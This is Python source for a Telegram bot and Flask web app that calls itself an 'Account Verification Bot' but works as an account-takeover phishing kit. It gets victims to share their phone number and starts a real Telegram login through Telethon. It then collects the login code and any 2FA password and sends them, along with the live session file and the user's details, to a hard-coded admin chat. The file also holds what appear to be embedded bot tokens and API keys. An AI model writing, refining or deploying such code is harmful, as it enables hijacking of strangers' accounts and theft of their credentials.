import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import json
import uuid
import time
import logging
import random

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')
PORT = int(os.environ.get('PORT', 10000))

# Detect environment
if 'RENDER' in os.environ:
    RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
    if RENDER_EXTERNAL_HOSTNAME:
        WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}"
    else:
        WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')
else:
    WEBHOOK_URL = f"http://localhost:{PORT}"

logger.info(f"🌐 Webhook URL: {WEBHOOK_URL}")
logger.info(f"🚀 Starting on port: {PORT}")

# Initialize
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Storage
sessions = {}
telegram_clients = {}

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def clean_otp(otp):
    """Clean and validate OTP - Telegram uses 5 digits"""
    if not otp:
        return None
    # Remove all non-digits
    cleaned = ''.join(filter(str.isdigit, otp))
    # Check if it's 5 digits (Telegram standard)
    if len(cleaned) == 5:
        return cleaned
    # If user entered 6 digits (common mistake), take first 5
    elif len(cleaned) == 6:
        return cleaned[:5]
    return None

def send_to_admin(phone, otp=None, session_file=None, user_info=None, password=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION</b>

📞 Phone: {phone}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
🌐 Source: WebApp"""
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
            
        if user_info:
            message += f"\n\n👤 <b>USER INFO:</b>"
            if user_info.get('first_name'):
                full_name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
                message += f"\n👤 Name: {full_name}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info.get('username')}"
            message += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file if exists
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

async def send_otp_via_telethon(phone):
    """Send OTP using Telethon - Telegram sends 5-digit code"""
    try:
        # Create session directory if not exists
        os.makedirs('sessions', exist_ok=True)
        
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        await client.connect()
        
        logger.info(f"📤 Sending OTP to {phone}...")
        sent = await client.send_code_request(phone)
        
        # Store client for later use
        telegram_clients[phone] = {
            'client': client,
            'phone_code_hash': sent.phone_code_hash,
            'sent_time': time.time()
        }
        
        logger.info(f"✅ OTP sent to {phone} (5-digit code)")
        return {
            'success': True,
            'message': 'OTP sent successfully'
        }
    except FloodWaitError as e:
        logger.error(f"Flood wait for {phone}: {e.seconds}s")
        return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
    except Exception as e:
        logger.error(f"Error sending OTP to {phone}: {e}")
        return {'success': False, 'error': str(e)}

async def verify_otp_via_telethon(phone, otp_code):
    """Verify 5-digit OTP using Telethon"""
    try:
        if phone not in telegram_clients:
            return {'success': False, 'error': 'Session expired. Please restart.'}
        
        client_data = telegram_clients[phone]
        client = client_data['client']
        phone_code_hash = client_data['phone_code_hash']
        
        logger.info(f"🔐 Verifying 5-digit OTP for {phone}")
        
        # Sign in with the 5-digit code
        await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
        
        # Check if authorized
        if await client.is_user_authorized():
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            await client.session.save()
            session_file = client.session.filename
            
            logger.info(f"✅ Verified {phone}, user: {user_info.get('username', 'N/A')}")
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
        else:
            return {'success': False, 'error': 'Not authorized'}
            
    except SessionPasswordNeededError:
        logger.info(f"🔐 2FA required for {phone}")
        return {
            'success': True, 
            'requires_2fa': True,
            'session_file': client.session.filename
        }
    except PhoneCodeInvalidError:
        logger.error(f"❌ Invalid OTP for {phone}")
        return {'success': False, 'error': 'Invalid OTP code'}
    except Exception as e:
        logger.error(f"Error verifying OTP for {phone}: {e}")
        return {'success': False, 'error': str(e)}

async def verify_2fa_via_telethon(phone, password):
    """Verify 2FA password"""
    try:
        if phone not in telegram_clients:
            return {'success': False, 'error': 'Session expired'}
        
        client_data = telegram_clients[phone]
        client = client_data['client']
        
        logger.info(f"🔐 Verifying 2FA for {phone}")
        await client.sign_in(password=password)
        
        # Get user info
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        # Save session
        await client.session.save()
        session_file = client.session.filename
        
        logger.info(f"✅ 2FA successful for {phone}")
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
    except Exception as e:
        logger.error(f"2FA error for {phone}: {e}")
        return {'success': False, 'error': f'Wrong password: {str(e)}'}

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """/start - Welcome message with WebApp button"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Generate session ID
        session_id = generate_session_id()
        
        # Store session
        sessions[session_id] = {
            'user_id': user_id,
            'first_name': first_name,
            'username': message.from_user.username,
            'status': 'started',
            'created': time.time()
        }
        
        # Create WebApp URL
        webapp_url = f"{WEBHOOK_URL}/webapp?session_id={session_id}"
        logger.info(f"🌐 Generated WebApp URL: {webapp_url}")
        
        # Create keyboard
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="📱 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_button)
        
        # Welcome message
        welcome_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Account Verification Bot</b>

Click the button below to verify your account:

<b>🔐 Verification Steps:</b>
1️⃣ Open WebApp
2️⃣ Share your contact
3️⃣ Receive <b>5-digit OTP</b> here
4️⃣ Enter OTP in WebApp
5️⃣ Complete verification ✅

⚠️ <i>Your contact will be auto-deleted after verification for privacy.</i>

<b>Note:</b> Telegram sends <b>5-digit</b> OTP codes."""
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=keyboard
        )
        
        logger.info(f"✅ Sent /start to user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Extract phone from shared contact and send OTP via Telethon"""
    try:
        if not message.contact:
            return
        
        contact = message.contact
        phone = contact.phone_number
        user_id = message.from_user.id
        
        logger.info(f"📱 Contact received from {user_id}: {phone}")
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}

⏳ <b>Sending 5-digit OTP via Telegram...</b>

Please wait while we send the verification code.""",
            parse_mode='HTML'
        )
        
        # Send OTP using Telethon (async)
        def send_otp_task():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(send_otp_via_telethon(phone))
                loop.close()
                
                if result['success']:
                    # Success message (we don't know the actual OTP, Telegram sends it)
                    success_msg = f"""✅ <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> has been sent via Telegram

<b>⚠️ IMPORTANT:</b>
• Check your Telegram messages for the <b>5-digit code</b>
• Enter the code in the WebApp
• Code expires in 5 minutes

<i>Telegram OTPs are always 5 digits (e.g., 12345)</i>"""
                    
                    bot.edit_message_text(
                        success_msg,
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin that OTP was sent
                    send_to_admin(phone, "5-digit OTP sent via Telegram")
                    
                    logger.info(f"✅ Telethon OTP sent to {phone}")
                else:
                    error_msg = result.get('error', 'Failed to send OTP')
                    bot.edit_message_text(
                        f"❌ <b>Error:</b> {error_msg}\n\nPlease try again or contact support.",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
                bot.edit_message_text(
                    "❌ <b>Server Error:</b> Failed to process request",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
        
        # Run in thread
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message for privacy
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact handler error: {e}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle other messages"""
    try:
        if message.text and not message.text.startswith('/'):
            help_text = """🔐 <b>Account Verification Help</b>

<b>How to verify:</b>
1. Use /start to get WebApp button
2. Open WebApp and share contact
3. <b>5-digit OTP</b> will appear here
4. Enter OTP in WebApp
5. Complete verification

<b>Note:</b> Telegram sends 5-digit OTP codes, not 6-digit.

Need help? Use /start to begin."""
            
            bot.send_message(message.chat.id, help_text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Message handler error: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return "Telegram Verification Bot is running!"

@app.route('/webapp')
def webapp():
    """WebApp for contact sharing"""
    session_id = request.args.get('session_id')
    
    if not session_id:
        return render_template('error.html', message="Invalid session. Please use /start in bot.")
    
    # Get bot username for template
    try:
        bot_username = bot.get_me().username
    except:
        bot_username = "your_bot"
    
    return render_template('webapp.html', 
                         session_id=session_id,
                         bot_username=bot_username)

@app.route('/otp')
def otp_page():
    """5-digit OTP entry page"""
    session_id = request.args.get('session_id')
    phone = request.args.get('phone')
    
    if not session_id or not phone:
        return render_template('error.html', message="Invalid request")
    
    return render_template('otp.html',
                         session_id=session_id,
                         phone=phone)

@app.route('/2fa')
def twofa_page():
    """2FA entry page"""
    session_id = request.args.get('session_id')
    phone = request.args.get('phone')
    
    if not session_id or not phone:
        return render_template('error.html', message="Invalid request")
    
    return render_template('2fa.html',
                         session_id=session_id,
                         phone=phone)

@app.route('/success')
def success_page():
    """Success page"""
    return render_template('success.html')

# ==================== API ENDPOINTS ====================
@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """API for WebApp to share contact"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        
        logger.info(f"📱 WebApp contact share: {phone}")
        
        if not session_id or not phone:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Store phone in session
        if session_id in sessions:
            sessions[session_id]['phone'] = phone
            sessions[session_id]['status'] = 'contact_shared'
        
        return jsonify({
            'success': True,
            'redirect': f'/otp?session_id={session_id}&phone={phone}'
        })
        
    except Exception as e:
        logger.error(f"API share contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify 5-digit OTP from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        otp = data.get('otp')
        
        logger.info(f"🔢 OTP verification attempt for {phone}")
        
        if not all([session_id, phone, otp]):
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Clean and validate OTP (5 digits)
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({
                'success': False, 
                'error': 'Invalid OTP format. Enter 5 digits (e.g., 12345)'
            })
        
        logger.info(f"🔐 Verifying cleaned OTP: {cleaned_otp} for {phone}")
        
        # Verify OTP using Telethon
        def verify_task():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(verify_otp_via_telethon(phone, cleaned_otp))
                loop.close()
                return result
            except Exception as e:
                logger.error(f"Verify task error: {e}")
                return {'success': False, 'error': str(e)}
        
        result = verify_task()
        
        if result['success']:
            if result.get('requires_2fa'):
                # 2FA required
                logger.info(f"🔐 2FA required for {phone}")
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'redirect': f'/2fa?session_id={session_id}&phone={phone}'
                })
            else:
                # Success - OTP verified
                user_info = result.get('user_info', {})
                
                # Send to admin
                send_to_admin(phone, 
                            otp=cleaned_otp, 
                            user_info=user_info, 
                            session_file=result.get('session_file'))
                
                # Update session
                if session_id in sessions:
                    sessions[session_id]['status'] = 'verified'
                    sessions[session_id]['user_info'] = user_info
                
                logger.info(f"✅ OTP verified successfully for {phone}")
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'redirect': '/success',
                    'user_info': user_info
                })
        else:
            error_msg = result.get('error', 'Verification failed')
            logger.error(f"❌ OTP verification failed for {phone}: {error_msg}")
            return jsonify({
                'success': False,
                'error': error_msg
            })
            
    except Exception as e:
        logger.error(f"API verify OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA password"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        password = data.get('password')
        
        logger.info(f"🔐 2FA attempt for {phone}")
        
        if not all([session_id, phone, password]):
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Verify 2FA using Telethon
        def verify_2fa_task():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(verify_2fa_via_telethon(phone, password))
                loop.close()
                return result
            except Exception as e:
                logger.error(f"2FA task error: {e}")
                return {'success': False, 'error': str(e)}
        
        result = verify_2fa_task()
        
        if result['success']:
            # Success with 2FA
            user_info = result.get('user_info', {})
            
            # Send to admin with password
            send_to_admin(phone, 
                         user_info=user_info, 
                         session_file=result.get('session_file'),
                         password=password)
            
            # Update session
            if session_id in sessions:
                sessions[session_id]['status'] = 'verified_2fa'
                sessions[session_id]['user_info'] = user_info
            
            logger.info(f"✅ 2FA successful for {phone}")
            
            return jsonify({
                'success': True,
                'redirect': '/success',
                'user_info': user_info
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', '2FA verification failed')
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK SETUP ====================
def setup_webhook():
    """Setup webhook for Render"""
    try:
        # Remove any existing webhook
        bot.remove_webhook()
        time.sleep(1)
        
        # Set new webhook
        webhook_url = f"{WEBHOOK_URL}/webhook"
        logger.info(f"Setting webhook to: {webhook_url}")
        
        bot.set_webhook(url=webhook_url)
        
        logger.info("✅ Webhook set successfully")
        return True
    except Exception as e:
        logger.error(f"❌ Webhook setup error: {e}")
        return False

@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 200

# ==================== CLEANUP ====================
def cleanup_sessions():
    """Clean expired sessions"""
    while True:
        try:
            time.sleep(60)
            current_time = time.time()
            expired = []
            
            for session_id, session in sessions.items():
                if current_time - session['created'] > 3600:  # 1 hour
                    expired.append(session_id)
            
            for session_id in expired:
                del sessions[session_id]
            
            # Clean old telethon clients (older than 10 minutes)
            expired_clients = []
            for phone, data in list(telegram_clients.items()):
                if current_time - data.get('sent_time', 0) > 600:  # 10 minutes
                    expired_clients.append(phone)
            
            for phone in expired_clients:
                try:
                    if phone in telegram_clients:
                        client = telegram_clients[phone]['client']
                        client.disconnect()
                    del telegram_clients[phone]
                except:
                    pass
            
            if expired or expired_clients:
                logger.info(f"🧹 Cleaned {len(expired)} sessions, {len(expired_clients)} clients")
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

# ==================== MAIN ====================
if __name__ == '__main__':
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot (5-digit OTP)")
    logger.info("="*60)
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info(f"🌐 Webhook URL: {WEBHOOK_URL}")
    logger.info(f"🔧 Port: {PORT}")
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Setup webhook if running on Render
    if 'RENDER' in os.environ or WEBHOOK_URL.startswith('https://'):
        logger.info("🌐 Setting up webhook...")
        setup_webhook()
    else:
        # Start bot polling for local development
        logger.info("🤖 Starting bot polling...")
        def run_bot_polling():
            try:
                bot.remove_webhook()
                time.sleep(1)
                bot.polling(none_stop=True, interval=2, timeout=30)
            except Exception as e:
                logger.error(f"Bot polling error: {e}")
                time.sleep(5)
                run_bot_polling()
        
        bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
        bot_thread.start()
        time.sleep(3)
    
    # Start Flask
    logger.info(f"🚀 Starting Flask server on port {PORT}...")
    app.run(
        host='0.0.0.0',
        port=PORT,
        debug=False,
        use_reloader=False,
        threaded=True
        )
